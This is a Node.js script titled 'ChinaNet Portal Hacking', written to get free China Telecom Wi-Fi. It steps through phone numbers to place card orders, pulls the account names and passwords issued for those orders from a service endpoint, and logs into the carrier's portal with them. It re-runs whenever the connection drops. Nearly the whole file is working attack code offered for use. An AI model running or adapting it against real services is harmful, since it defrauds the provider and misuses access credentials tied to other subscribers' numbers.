/*!
 * ChinaNet Portal Hacking v0.0.4 by Dolphin @BUCT_SNC_SYS.
 * Copyright 2014 Dolphin Wood.
 * Licensed under http://opensource.org/licenses/MIT
 *
 * Designed and built with all the love in the world.
 *
 * Just typing iphoneNumber in shell to run it;
 * Everything will be done automatically :)
 */
var http = require('http');
var querystring = require('querystring');
try {
    var colors = require('./colors');
} catch (e) {
    console.warn('缺少 colors 模块');
}

function colorConsole(str, color) {
    // 彩色输出
    var colorful = str[color];
    if (!colorful)
        console.log(str);
    else
        console.log(colorful.bold);
}

function opt(path, cookie) {
    // http req opt 读不到 prototype 值
    this.host = 'wifi.189.cn';
    if (path)
        this.path = path;
    if (cookie) {
        this.headers = {};
        this.headers.cookie = cookie;
    }
}

var init = {
    cookie: null,
    phone: undefined,
    NasType: 'Huawei',
    NasName: 'BJ-JA-SR-1.M.ME60', // BUCT 默认值
    tryConnect: function(callback) {
        // 尝试连接，用于获取网关信息或测试网络连接
        // 那就愉快地异步了吧~
        var options = {
            host: 'www.baidu.com',
            path: '/index.html'
        };
        var req = http.get(options, function(res) {
            if (callback && typeof(callback) === 'function')
                return callback(res.statusCode); // 检测网络连接时不用进行下面的步骤
            if (res.headers.location) {
                // 获取到的重定向地址如：https://wlan.ct10000.com/portal/Huawei.redirect?NasName=BJ-JA-SR-1.M.ME60
                var nasInfo = res.headers.location.split('/portal/')[1];
                if (!nasInfo)
                    return false;
                var NasType = nasInfo.split('.')[0];
                var NasName = nasInfo.split('NasName=')[1];
                if (!NasType || !NasName)
                    return false;
                init.NasName = NasName;
                init.NasType = NasType;
                colorConsole('\n获取到的网关信息：NasType=' + NasType + '\tNasName=' + NasName + '\n', 'cyan');
            }
        });
        req.on('error', function(e) {
            colorConsole('请求出错: ' + e.message, 'red');
            process.exit();
        });
    },
    open: function() {
        // 发起请求，得到 cookie
        var path = '/service/index.jsp';
        var options = new opt(path);
        colorConsole('-->\n开始发起请求\n', 'yellow');
        var req = http.get(options, function(res) {
            res.setEncoding('utf8');
            var cookie = res['headers']['set-cookie'][0].split(';')[0];
            init.cookie = cookie;
            colorConsole('获得的 cookie：' + cookie + '\n', 'cyan');
            init.addGood(); // 触发 addGood 请求
        });
        req.on('error', function(e) {
            colorConsole('请求出错: ' + e.message + ',请检查网络连接\n', 'red');
        });
    },
    addGood: function() {
        // 向购物车添加物品
        colorConsole('开始模拟向购物车添加物品...\n', 'yellow');
        var path = '/service/cart.do?method=addGood&confirm=yes&cardId=1&type=1&count=1';
        var options = new opt(path, init.cookie);
        var req = http.get(options, function() {
            init.list(); // 触发 list 请求
        });
        req.on('error', function(e) {
            colorConsole('请求出错: ' + e.message + ',请检查网络连接\n', 'red');
        });
    },
    list: function() {
        // 打开购物车，使请求有效化
        colorConsole('打开购物车，使请求有效化...\n', 'yellow');
        var path = '/service/cart.do?method=list';
        var options = new opt(path, init.cookie);
        var req = http.get(options, function() {
            hack.getOrder(); // 触发 getOrder 请求
        });
        req.on('error', function(e) {
            colorConsole('请求出错: ' + e.message + ',请检查网络连接\n', 'red');
        });
    }
};

var hack = {
    uname: undefined, // 账号
    pwd: undefined, // 密码
    secTry: false, // 同一个账号尝试两次登录
    getOrder: function() {
        // 获取订单号
        var path = '/service/user.do?method=buy&confirm=yes&shopCartFlag=shopCart&cardType=1&cardPayType=yi&user_phone=&smsVerifyCode=&isBenJi=no&phone=' + init.phone + '&phone_1=' + init.phone;
        var options = new opt(path, init.cookie);
        colorConsole('开始获取订单号，手机号：' + init.phone + '...\n', 'yellow');
        var req = http.get(options, function(res) {
            res.setEncoding('utf8');
            res.on('data', function(data) {
                if (data[0] === '1') {
                    var orderId = data.split(',')[1];
                    colorConsole('得到的订单号：' + orderId + '\n', 'cyan');
                    hack.getPwd(orderId); // 获取账号密码
                } else {
                    if (data.indexOf('购物车为空') !== -1)
                        return init.tryConnect(), colorConsole('购物车为空，重新添加', 'magenta'); // 若没进行购物车添加，则返回重试
                    colorConsole(data.split(',')[1] + ' || 没有得到订单号，继续下一组尝试...\n', 'grey');
                    hack.getOrder(); // 获取数据出错则递增重试
                }
            });
        });
        req.on('error', function(e) {
            colorConsole('请求出错: ' + e.message + ',请检查网络连接\n', 'red');
        });
        process.send(++init.phone); // 为下次计算做准备
    },
    getPwd: function(orderId) {
        // 获取帐密
        colorConsole('开始获取账号密码...\n', 'yellow');
        var path = '/clientApi.do?method=get10mCard&orderId=' + orderId;
        var options = new opt(path); // 此处不能带有 cookie
        var req = http.get(options, function(res) {
            res.setEncoding('utf8');
            res.on('data', function(data) {
                colorConsole('收到的数据：' + data + '\n', 'cyan');
                if (data.indexOf('次数过多') !== -1)
                    return false;
                var t = data.split(','); // 获取有效信息
                if (t[4] && t[5]) {
                    hack.uname = t[4]; // uname
                    hack.pwd = t[5]; // pwd
                    hack.hackLogin(hack.uname, hack.pwd);
                } else {
                    colorConsole('未获取到，开始下一组尝试...\n', 'grey');
                    hack.getOrder();
                }
            });
        });
        req.on('error', function(e) {
            colorConsole('请求出错: ' + e.message + ',请检查网络连接\n', 'red');
        });
    },
    hackLogin: function(uname, pwd) {
        // 登录
        var info = {
            username: uname,
            password: pwd,
            validateCode: '',
            postfix: '@wlan.sh.chntel.com',
            address: 'sh',
            loginvalue: 'null',
            basePath: 'http://wlan.ct10000.com:80/portal/',
            language: 'CN_SC',
            longNameLength: 32,
            NasType: init.NasType,
            NasName: init.NasName,
            OrgURL: 'null',
            isMobileRand: false,
            isNeedValidateCode: false
        }; // 登录表单，似乎所有项目都不能少
        var contents = querystring.stringify(info);
        var options = {
            host: 'wlan.ct10000.com',
            path: '/portal/login4V2.do',
            method: 'POST', // 呃，虽然 GET 也可以啦~
            headers: {
                'Content-Type': 'application/x-www-form-urlencoded',
                'Content-Length': contents.length
            }
        };
        colorConsole('开始登录...\n', 'yellow');
        var req = http.request(options, function(res) {
            res.setEncoding('utf8');
            var output;
            res.on('data', function(data) {
                output += data;
            }).on('end', function() {
                var isConnected = output.indexOf('passwd error'); // 登录失败会返回含有此字符串的网页
                if (isConnected === -1) {
                    var time = new Date();
                    colorConsole('登录成功！八分钟后开始检查连接状态\t' + time.toTimeString().slice(0, 8) + '\n\n======= Hacked By Dolphin With Node.js =======\n', 'green');
                    hack.secTry = false; // 重置计数
                    setTimeout(function() {
                        colorConsole('开始检查网络连接...\n', 'magenta');
                        hack.checkDelay();
                    }, 480000); // 八分钟触发定时器
                } else {
                    if (hack.secTry) {
                        // 两次登录都失败就放弃吧
                        colorConsole('第二次登录失败，开始下一组尝试...\n', 'grey');
                        hack.secTry = false; // 重置计数
                        hack.getOrder();
                    } else {
                        // 电信渣服务器可能不能即时处理分配到的账号密码
                        colorConsole('登录失败，3s 后再次尝试登录...\n', 'magenta');
                        setTimeout(function() {
                            hack.secTry = true; // 标记第二次尝试
                            hack.hackLogin(hack.uname, hack.pwd);
                        }, 3000);
                    }
                }
            });
        });
        req.on('error', function(e) {
            colorConsole('登录出错: ' + e.message + ',请检查网络连接\n', 'red');
            process.exit();
        });
        req.write(contents); // 写入请求内容
        req.end();
    },
    checkNet: function(callback) {
        // 检测网络是否连接上
        if (!callback || typeof(callback) !== 'function')
            return false;
        init.tryConnect(function(statusCode) {
            if (statusCode !== 200) {
                colorConsole('网络断开，开始下一组尝试...\n', 'grey');
                hack.getOrder(); // 网络断开，开始新的计算
                callback(true);
            } else
                callback(false);
        })
    },
    checkDelay: function() {
        // 定时检测网络连接状态
        hack.checkNet(function(isOffLine) {
            if (!isOffLine)
                setTimeout(hack.checkDelay, 1000);
        });
    }
};
process.on('message', function(status) {
    init.phone = status.phone;
    if (status.crashed) {
        colorConsole('\n主进程已重新启动！\n', 'yellow');
        colorConsole('\n开始检测网络连接\n', 'green');
        hack.checkDelay();
    } else {
        init.tryConnect();
        init.open();
    }
}).on('uncaughtException', function(err) {
    // 异常抛出
    colorConsole('Uncaught Exception ' + err, 'red');
    process.exit();
});
